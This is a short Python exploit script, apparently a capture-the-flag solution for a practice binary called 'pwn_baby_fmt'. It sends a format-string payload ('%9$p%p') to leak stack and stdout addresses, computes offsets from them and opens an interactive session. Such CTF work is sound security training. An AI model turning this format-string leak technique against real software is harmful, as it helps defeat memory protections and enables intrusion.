from roppy import *


elf = ELF("./pwn_baby_fmt")

#p = gdb.debug("./pwn_baby_fmt",env={"LD_PRELOAD":"./libc.so"},gdbscript = '''
#init-pwndbg
#breakrva 0x13c0
#breakrva 0x145b
#breakrva 0x143c
#breakrva 0x13d8
#breakrva 0x148e''')
p = process("./pwn_baby_fmt")
print(p.recvline())
p.sendline("%9$p%p")
p.recvline()

leak = p.recvline()[2:].split(b"0x")
hack_leak = int(leak[0], 16)&0x0ffffffff
stdout_leak = int(leak[1], 16)-131
print("leak: " + hex(hack_leak))
print("stdout: " + hex(stdout_leak))

p.interactive()